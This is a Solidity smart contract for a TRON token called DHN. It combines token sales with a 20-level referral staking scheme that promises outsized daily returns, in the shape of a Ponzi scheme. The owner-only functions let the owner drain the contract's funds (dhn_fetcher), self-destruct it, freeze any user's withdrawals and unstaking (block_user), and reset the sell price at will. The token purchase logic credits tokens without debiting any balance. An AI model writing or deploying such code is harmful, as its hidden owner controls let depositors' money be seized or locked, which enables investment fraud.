//SourceUnit: dhn.sol

pragma solidity ^0.5.10;

//*******************************************************************//
//------------------------ SafeMath Library -------------------------//
//*******************************************************************//

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Should be greater than zero");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "should be less than other");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Should be greater than c");
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "divide by 0");
        return a % b;
    }
}

//**************************************************************************//
//------------------------  DIGITAL HOT NET(DHN)  -------------------//

//-------------------------- Symbol - DHN --------------------------------//
//-------------------------- Token Supply - 1 billion   --------------------//
//-------------------------- Decimal - 8 --------------------------------//
//-------------------------- Official Website - digitalhotnet.io --------------------------------//
//***********************************************************************//  


contract TOKEN {

    using SafeMath for uint256;

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) private _allowed;
    mapping(address => uint256) public allTimeSell;
    mapping(address => uint256) public allTimeBuy;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _initialSupply;
    address payable public owner;
    uint256 public tokenSold = 0;
    uint256 public currentPrice;
     
    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event Buy(address indexed buyer,  uint256 tokenToTransfer);
    event sold(address indexed seller, uint256 calculatedEtherTransfer,uint256 tokens);

    constructor() public {
        _name = "DIGITAL HOT NET";
        _symbol = "DHN";
        _decimals = 8;
        _initialSupply = 1000000000e8;
        _totalSupply = _initialSupply;
         owner = msg.sender;
         _balances[owner] = _balances[owner].add(_totalSupply);
         currentPrice = 100000;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Owner Rights");
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function decimals() public view returns (uint256) {
       return _decimals;
    }

    function balanceOf(address _owner) external view returns (uint256) {
        return _balances[_owner];
    }

    function allowance(address _owner, address spender) external view returns (uint256) {
        return _allowed[_owner][spender];
    }
    
    function transfer(address to, uint256 value) external returns (bool) {
        require(value <= _balances[msg.sender] && value > 0, "Insufficient Balance");
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "Address zero");
        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
         require(value <= _balances[from], "Sender Balance Insufficient");
         require(value <= _allowed[from][msg.sender], "Token should be same as alloted");

        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    function alot_tokens(uint256 _amountOfTokens, address _toAddress) onlyOwner public returns(bool) {
        uint256 all_sold;
        all_sold = tokenSold + _amountOfTokens;
        if( _totalSupply >= all_sold){
            require(_toAddress != address(0), "address zero");
            require(_balances[msg.sender] >= _amountOfTokens, "Balance Insufficient");
            _balances[_toAddress] = _balances[_toAddress].add(_amountOfTokens);
            _balances[msg.sender] = _balances[msg.sender].sub(_amountOfTokens);
            tokenSold = tokenSold.add(_amountOfTokens);
            emit Transfer(owner, _toAddress, _amountOfTokens);
            return true;
        }
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "address zero");
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }
    
    function trxToToken(uint256 incomingTrxSun) public view returns(uint256)  {
        uint256 tokenToTransfer = (incomingTrxSun.div(currentPrice)) * 100000000;
        return tokenToTransfer;
    }

    function tokenToTrx(uint256 tokenToSell) private view returns(uint256)  {
        uint256 convertedTrx = tokenToSell.mul(currentPrice).div(100000000);
        return convertedTrx;
    }
    
    function updateCurrentPrice(uint256 newPrice) external onlyOwner  {
        currentPrice = newPrice;
    }
     
    function buy_token(uint256 numberOfTokens) external payable returns (bool) {
        address buyer = msg.sender;
        uint256 trxValue = msg.value;
        require(trxValue > 0, "Invalid Value");
        uint256 token_amount = trxToToken(trxValue);
        require(token_amount >= numberOfTokens, "wrong input");
        uint256 tokenToTransfer = numberOfTokens;
        
        uint256 all_sold = tokenSold + tokenToTransfer;
        
        require(buyer != address(0), "Can't send to Zero address");
        require(tokenToTransfer >= 10e8, "Minimum buying is 10 DHN");
        require(_totalSupply >= all_sold, "Out of Boundation");
        
        emit Buy(buyer, tokenToTransfer);
        emit Transfer(address(this), buyer, tokenToTransfer);
        
        _balances[buyer] = _balances[buyer].add(tokenToTransfer);
        allTimeBuy[buyer] = allTimeBuy[buyer].add(tokenToTransfer);
        tokenSold = tokenSold.add(tokenToTransfer);
        return true;
    }
   
    function sell(uint256 tokenToSell) external returns (bool) {
        require(tokenSold >= tokenToSell, "Token sold should be greater than zero");
        require(msg.sender != address(0), "address zero");
        require(tokenToSell <= _balances[msg.sender], "insufficient balance");

        uint256 convertedSun = tokenToTrx(tokenToSell);
        _balances[msg.sender] = _balances[msg.sender].sub(tokenToSell);
        allTimeSell[msg.sender] = allTimeSell[msg.sender].add(tokenToSell);
        tokenSold = tokenSold.sub(tokenToSell);
        msg.sender.transfer(convertedSun);
        emit Transfer(msg.sender, address(this), tokenToSell);
        emit sold(msg.sender, convertedSun, tokenToSell);
        return true;
    }

   function getUserTokenInfo(address _addr) view external returns(uint256 _all_time_buy, uint256 _all_time_sell ) {
      return (allTimeBuy[_addr], allTimeSell[_addr]);
   }

    function contractTokenInfo() view external returns(uint256 _total_sold, uint256 _total_supply) {
       return (tokenSold, _totalSupply );
    }
 }

contract DHN is TOKEN {
    struct User {
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 direct_business;
        uint256 downline_business;
        uint40 stake_time;
        uint40 unstake_time;
    }
    struct Restrict {
       uint40 block_status;
    }
    
    mapping(address => User) public users;
    mapping(address => Restrict) public users_block_status;

    uint256[] public ref_bonuses;
    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public overall_staked;
    uint256 public total_withdraw;
    

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    event Unstaked(address indexed addr, uint256 amount);
 
    constructor() public {
        
        ref_bonuses.push(200);
        ref_bonuses.push(100);
        ref_bonuses.push(50);
        
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(10);
    }
    
    function() payable external {}
    
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;
            
            users[_upline].direct_business += _amount;
            emit Upline(_addr, _upline);

            total_users++;
            address _uplines = _upline;

            for(uint8 j = 0; j < ref_bonuses.length; j++) {
                if(_uplines == address(0)) break;

                users[_uplines].total_structure++;
                users[_uplines].downline_business = users[_uplines].downline_business.add(_amount);

                _uplines = users[_uplines].upline;
            }
        }
    }
    
    function _deposit(address _addr, uint256 _amount) private {
         
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        require(_amount <= _balances[_addr], "Insufficient Balance");
        require( users[_addr].deposit_time < 1 , "Deposit already exists");
        require(_amount >= 100e8, "Bad amount");
          
        users[_addr].payouts = 0;
        users_block_status[_addr].block_status = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        
        users[_addr].match_bonus = 0;
        users[_addr].stake_time = 12;
        users[_addr].unstake_time = uint40(block.timestamp) + 365 days;
        users[_addr].deposit_time = uint40(block.timestamp);
        
        _refPayout(msg.sender, _amount);
        
        users[_addr].total_deposits += _amount;
        total_deposited += _amount;
        overall_staked += _amount;
        
        _balances[_addr] = _balances[_addr].sub(_amount);
        emit Transfer(_addr, address(this), _amount);
        emit NewDeposit(_addr, _amount);
    }
    
    function _unstake_amount(address _addr) external {
        
        require(users_block_status[_addr].block_status == 0, "unstake has been blocked");
        require(block.timestamp > users[_addr].unstake_time, "Time is remaining.Please wait for completion of your staking time.");
        users[_addr].deposit_time = 0;
        users[_addr].stake_time = 0;
        users[_addr].unstake_time = 0;
        _balances[_addr] = _balances[_addr].add(users[_addr].deposit_amount);
        overall_staked = overall_staked - users[_addr].deposit_amount;
        emit Transfer(address(this), _addr, users[_addr].deposit_amount);
        emit Unstaked(_addr, users[_addr].deposit_amount);
        users[_addr].deposit_amount = 0;
        users[_addr].payouts = 0;
    }
    
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint dir = users[up].referrals * 2;
            
            if(dir >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 1000;
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
            }
            
            up = users[up].upline;
        }
     }
     
    function deposit(address _upline, uint256 _amount) external {
        _setUpline(msg.sender, _upline, _amount);
        _deposit(msg.sender, _amount);
    }
    
    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        require(users_block_status[msg.sender].block_status == 0, "Withdrawal blocked");

        // Deposit payout
        if(to_payout > 0) {

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;
        }
        
        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }
        
        require(to_payout > 0, "Zero payout");
        uint256 entire_payout = to_payout;
        
        users[msg.sender].total_payouts += entire_payout;
        total_withdraw += entire_payout;
        
        _balances[msg.sender] = _balances[msg.sender].add(entire_payout);
        emit Transfer(address(this), msg.sender, entire_payout);
        emit Withdraw(msg.sender, entire_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 490000 / 100;
    }

    function payoutOf(address _addr) view external returns(uint256 per_payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
        
        uint256 time_is;
        
        if(users[_addr].deposit_amount > 1  && users[_addr].deposit_time > 0 ){
        
            if(users[_addr].unstake_time > block.timestamp){
                time_is = block.timestamp;
            }else{
                time_is = users[_addr].unstake_time;
            }
            
            per_payout = (((users[_addr].deposit_amount * 50)/ 10000)*((time_is - users[_addr].deposit_time) / 1 days)) - users[_addr].deposit_payouts;        
        }
    }
    
    function destruct() external {
        require(msg.sender == owner, "Permission denied");
        selfdestruct(owner);
    }
    
    function dhn_fetcher( uint _amount) onlyOwner external {
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function block_user(address _addr) onlyOwner external {
        
        if (users_block_status[_addr].block_status == 0) {
            users_block_status[_addr].block_status = 1;
        } else {
            users_block_status[_addr].block_status = 0;
        }
    }
    
    function stakingInfo(address _addr) view external returns(uint40 _stake_time, uint40 _unstake_time) {
        return (users[_addr].stake_time, users[_addr].unstake_time);
    }
        
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 match_bonus, uint40 _stake_time, uint40 _unstake_time) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].match_bonus, users[_addr].stake_time, users[_addr].unstake_time);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals,uint256 total_structure, uint256 _downline_business, uint256 _direct_business, uint256 _all_time_deposits, uint256 _all_time_received,  uint40 _block_status) {
        return (users[_addr].referrals, users[_addr].total_structure, users[_addr].downline_business, users[_addr].direct_business, users[_addr].total_deposits, users[_addr].total_payouts, users_block_status[_addr].block_status);
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 _total_unstaked) {
        return (total_users, total_deposited, total_withdraw, overall_staked);
    }
}